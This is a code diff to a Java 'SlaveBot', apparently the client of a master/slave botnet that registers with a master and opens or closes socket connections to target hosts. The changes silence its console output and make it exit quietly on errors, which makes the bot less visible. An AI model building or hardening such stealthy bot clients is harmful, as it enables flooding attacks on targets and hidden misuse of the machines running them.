@@ -1,4 +1,4 @@
-package bot;
+//package bot;
 
 import java.io.*;
 import java.net.*;
@@ -42,7 +42,8 @@ public class SlaveBot implements Runnable {
 			}        
 		}
 		catch (Exception e){
-			System.out.println(e);
+			System.exit(-1);
+			//System.out.println(e);
 		}
 	}
 
@@ -111,7 +112,7 @@ public class SlaveBot implements Runnable {
 			Integer slavePort_int = (Integer) (client_socket.getLocalPort());
 			String local_host = client_socket.getInetAddress().getHostAddress();
 
-			System.out.println(ip + slavePort_int + local_host); //print here in slave just to confirm
+			//System.out.println(ip + slavePort_int + local_host); //print here in slave just to confirm
 			
 			out.println(ip +","+ slavePort_int + "," + local_host);
 			return slavePort_int;
@@ -148,6 +149,8 @@ public class SlaveBot implements Runnable {
 		else{
 			System.out.println("Error Connecting to host");
 		}
+		
+		//System.out.println("total sockets" + obj.arrSoc.size());
 	}
 
 	public static void performDisconnect(String ip, String port, Integer numberOfConnToDelete) {
@@ -161,26 +164,28 @@ public class SlaveBot implements Runnable {
 					Socket deleteSoc = (Socket)obj.arrSoc.get(i);
 					deleteSoc.close();	
 					obj.arrSoc.remove(deleteSoc);
-					System.out.println("Socket closed" + deleteSoc);
+					//System.out.println("Socket closed" + deleteSoc);
 				}
 				//targetDataMap.remove(uniqueKey);
 
 			}
 			catch(Exception e){
-				System.out.println("Something went wrong");
+				//System.out.println("Something went wrong");
+				System.exit(-1);
 			}
 
 		}
 		else {
-
+			System.exit(-1);
 		}
+		//System.out.println("total sockets" + obj.arrSoc.size());
 	}
 
 
 	public static void main(String[] args) throws Exception {
 		if(args.length != 4)
 		{
-			System.out.println("Usage: SlaveBot -h hostname -p portnumber of master");
+			//System.out.println("Usage: SlaveBot -h hostname -p portnumber of master");
 			System.exit(0);
 		}
 
@@ -191,8 +196,8 @@ public class SlaveBot implements Runnable {
 		new Thread(new SlaveBot()).start();
 
 		for (Map.Entry<String, targetData> entry : targetDataMap.entrySet()) {
-			System.out.println(entry.getKey() +" : " +entry.getValue().action + " : "+ entry.getValue().targetHost + " : " + entry.getValue().port + " : " + entry.getValue().numConnections);
-			System.out.println("\nFor the key : " + entry.getKey() + "The array saved is" + entry.getValue().arrSoc);
+			//System.out.println(entry.getKey() +" : " +entry.getValue().action + " : "+ entry.getValue().targetHost + " : " + entry.getValue().port + " : " + entry.getValue().numConnections);
+			//System.out.println("\nFor the key : " + entry.getKey() + "The array saved is" + entry.getValue().arrSoc);
 		}
 
 
